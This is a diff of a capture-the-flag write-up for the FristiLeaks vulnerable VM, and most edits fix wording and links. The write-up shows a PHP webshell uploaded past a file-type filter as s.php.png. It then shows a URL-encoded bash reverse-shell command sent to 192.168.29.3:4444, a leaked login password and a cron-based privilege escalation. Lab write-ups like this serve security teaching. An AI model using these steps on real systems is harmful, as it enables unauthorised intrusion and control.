@@ -37,7 +37,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sun Feb 16 00:31:08 2020 -- 1 IP address (1 host up) scanned in 14.25 seconds
 ```
 
-So all we have is a web serve on port 80. Checking out the urls in robot.txt just returns a image stating that we are looking at the wrong url. Other enumeration methods turned up empty or useless results. I was banging my head against the wall looking for any possible attack avenue. In the end I has to go online to look for some hints. Turns out that there is a directory named `fristi`. How the hell was I supposed to find that?. Mahn I hate this kind of ctf challenges. So anyways lets see whats in there.
+So all we have is a web server on port 80. Checking out the urls in `robot.txt` just returns a image stating that we are looking at the wrong url. Other enumeration methods turned up empty or useless results.   
+I was banging my head against the wall looking for any possible attack avenue. In the end I has to go online to look for some hints. Turns out that there is a directory named `fristi`. How the hell was I supposed to find that?. Mahn I hate this kind of ctf challenges. So anyways lets see whats in there.
 
 ![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/fristileaks/login.png){: .align-center}
     
@@ -94,22 +95,22 @@ We have a message by user `eezeepz` and we have two images encode in base64.(I d
 
 ![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/fristileaks/base64.png){: .align-center}
     
-We are presented with a string, which might be probably be the password for `eezeepz`. Login into the admin console using the password `keKkeKKeKKeKkEkkEk`.
+We are presented with a string, which might probably be the password for `eezeepz`. Login into the admin console using the password `keKkeKKeKKeKkEkkEk`.
     
+![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/fristileaks/upload.png){: .align-center}
+
 We are greeted with a upload file page, that only allows `png,jpg,gif`. After trying out various payloads, I found the following.
 
-![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/fristileaks/login.png){: .align-center}
-
 1. The file has to end with `.png` to be uploaded
-2. The [magic byte]() of the file is irrelevant.
+2. The [magic byte](https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/) of the file is irrelevant.
 
-I used simple php backdoor available at `/usr/share/webshells/php/simple-backdoor.php`, renamed it as `s.php.png` and uploaded it and it can be accessed from `http://fristileaks.com/fristi/uploads/s.php.png?`
+I used simple php backdoor available at `/usr/share/webshells/php/simple-backdoor.php`, renamed it as `s.php.png` and uploaded it. Access it from `http://fristileaks.com/fristi/uploads/s.php.png?`
 
 ![image1]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhubimg/fristileaks/backdoor.png){: .align-center}
 
 ## Low Shell
 
-Run the following using the `php` backdoor, to get a `bah` reverse shell.
+Run the following command using the `php` backdoor, to get a `bash` reverse shell.
 
 ```bash
 fristileaks.com/fristi/uploads/s.php.png?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.29.3%2F4444%200%3E%261
@@ -151,7 +152,8 @@ run every minute with my account privileges.
 - Jerry
 ```
 
-Looks like a note from a user with higher privilege. Looks like we can run an binary as user `admin` by copying the command to a text file in `/tmp/`. The allowed binaries include `chmod`, `df`, `cat`, `echo`, `ps`, `grep`, `egrep`. We can change the permission of home directory of `admin` and see whats in there.
+Looks like a note from a user with higher privilege. We can run a limited set of binary as user `admin` by copying the command to a text file in `/tmp/`.  
+The allowed binaries include `chmod`, `df`, `cat`, `echo`, `ps`, `grep`, `egrep`. We can change the permission of home directory of `admin` and see whats in there.
 
 
 ```bash
@@ -233,7 +235,7 @@ cryptoResult=encodeString(sys.argv[1])
 print cryptoResult
 ```
 
-Okay so look like this python script is used to encrypt the password of `fristigod` and `admin`. Lets write a script that will run the algorithm in reverse and decode the password.
+Okay so look like this python script is used to encrypt the password using `rot13` and `base64`, of `fristigod` and `admin`. Lets write a script that will run the algorithm in reverse and decode the password.
 
 ### Python Decode Script
 
